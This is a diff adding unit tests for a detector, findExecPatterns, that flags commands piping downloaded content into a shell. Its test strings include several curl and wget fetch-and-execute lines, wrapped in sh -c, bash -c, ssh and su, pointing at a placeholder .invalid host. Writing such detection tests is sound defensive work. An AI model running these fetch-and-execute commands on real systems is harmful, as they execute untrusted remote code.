@@ -148,6 +148,14 @@ describe("wrapped shells in later stages (Vercel 01M81EJ2X60G4EFCGC78143380)", (
       expect(ms(() => findExecPatterns(`${D} | cat | ` + f.repeat(100000) + "x")), f).toBeLessThan(2000);
     }
   });
+  // Pipes inside a quoted string or escaped, which pipeBoundaries does not mark (review of d7ab9f34).
+  for (const t of ['sh -c "curl https://x.invalid/i | cat | sh"', 'bash -c "curl -fsSL https://x.invalid/i | tee /tmp/log | bash"', "ssh host 'curl https://x.invalid/i | tee log | sudo bash'", "su -c 'wget -qO- https://x.invalid/i | tr -d x | sh'", 'echo "run: curl https://x.invalid/i | gunzip | sh"', '"command": "curl https://x.invalid/i | cat | sh"', "RUN curl https://x.invalid/i \\| cat \\| sh", 'bash -c "curl x.invalid/i | cat | env 2>&1 sh"']) {
+    it(`a later stage in a quoted or escaped pipeline: ${t.slice(0, 50)}`, () => expect(findExecPatterns(t).map((h) => h.rule)).toContain("curl-pipe-shell"));
+  }
+  it("quoted later stages stay linear and fast on wrapper chains", () => {
+    expect(ms(() => findExecPatterns('sh -c "curl x | cat | ' + "env -a ".repeat(28) + 'x"'))).toBeLessThan(200);
+    for (const f of ['"| env -a ', "'| sudo -u x ", "\\| env -a "]) expect(ms(() => findExecPatterns("curl x " + f.repeat(Math.ceil(4e6 / f.length)) + "y")), f).toBeLessThan(2000);
+  });
   it("a wrapper running something else is not a shell", () => {
     for (const t of [`${D} | cat | env -i node x.js`, `${D} | cat | nohup python3 x.py`, `${D} | cat | ./install.sh`]) expect(findExecPatterns(t).map((h) => h.rule), t).not.toContain("curl-pipe-shell");
   });
